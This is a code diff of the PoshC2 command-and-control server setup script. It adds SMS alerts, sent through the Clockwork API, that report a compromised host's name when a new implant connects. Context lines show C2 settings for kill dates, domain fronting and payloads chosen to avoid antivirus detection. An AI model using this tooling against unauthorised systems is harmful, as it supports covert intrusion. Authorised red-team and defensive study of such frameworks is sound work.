@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
+Write-Host "=============== v2.10 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -293,6 +293,7 @@ if ($RestartC2Server)
     $downloaduri = $c2serverresults.DownloadURI
     $httpresponse = $c2serverresults.HTTPResponse
     $enablesound = $c2serverresults.Sounds
+    $apikey = $c2serverresults.APIKEY
     $urlstring = $c2serverresults.URLS
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
@@ -530,8 +531,16 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
     $prompt = Read-Host -Prompt "[8] Do you want to enable sound? [$($enablesound)]"
     $enablesound = ($enablesound,$prompt)[[bool]$prompt]
 
+    $enablesms = "No"
+    $prompt = Read-Host -Prompt "[9] Do you want to use Clockwork SMS for new payloads? [$($enablesms)]"
+    $enablesms = ($enablesms,$prompt)[[bool]$prompt]
+    if ($enablesms -eq "Yes") {
+        $apikey = Read-Host -Prompt "[9a] Enter Clockwork SMS API Key?"
+        $MobileNumber = Read-Host -Prompt "[9a] Enter Mobile Number to send to? [447898....]"
+    }
+
     $enablepayloads = "Yes"
-    $prompt = Read-Host -Prompt "[9] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
+    $prompt = Read-Host -Prompt "[10] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
     $enablepayloads = ($enablepayloads,$prompt)[[bool]$prompt]
     
     $downloaduri = Get-RandomURI -Length 5
@@ -623,6 +632,8 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
         ProxyUser TEXT,
         ProxyPass TEXT,
         Sounds TEXT,
+        APIKEY TEXT,
+        MobileNumber TEXT,
         URLS TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
@@ -633,8 +644,8 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, URLS)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @URLS)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
@@ -647,6 +658,8 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
         QuickCommand = $shortcut
         DownloadURI = $downloaduri
         Sounds = $enablesound
+        APIKEY = $apikey
+        MobileNumber = $MobileNumber
         URLS = $urlstring
     } | Out-Null
 
@@ -1136,8 +1149,6 @@ $message =[Convert]::ToBase64String($Bytes)
         Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
         # optional clockwork sms on new implant
-        $mobilenumber = ""
-        $apikey = ""
         if (($apikey) -and ($mobilenumber)){
             (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$apikey&to=$mobilenumber&from=PoshC2&content=$im_computername")|Out-Null
         }
